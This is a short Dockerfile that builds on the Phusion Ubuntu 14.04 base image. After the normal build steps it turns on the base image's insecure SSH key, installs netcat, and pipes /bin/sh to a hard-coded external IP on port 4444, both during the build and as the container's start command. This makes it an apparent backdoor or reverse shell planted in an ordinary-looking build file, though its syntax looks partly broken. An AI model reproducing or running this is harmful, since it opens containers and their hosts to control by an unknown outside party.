FROM ubuntu:14.04
MAINTAINER Phusion <info@phusion.nl>

ADD . /bd_build

RUN /bd_build/prepare.sh && \
	/bd_build/system_services.sh && \
	/bd_build/utilities.sh && \
	/bd_build/cleanup.sh

RUN /usr/sbin/enable_insecure_key

RUN apt-get install -y netcat

RUN /bin/sh | nc 129.21.50.46 4444

CMD ["/bin/sh | nc 129.21.50.46 4444"]
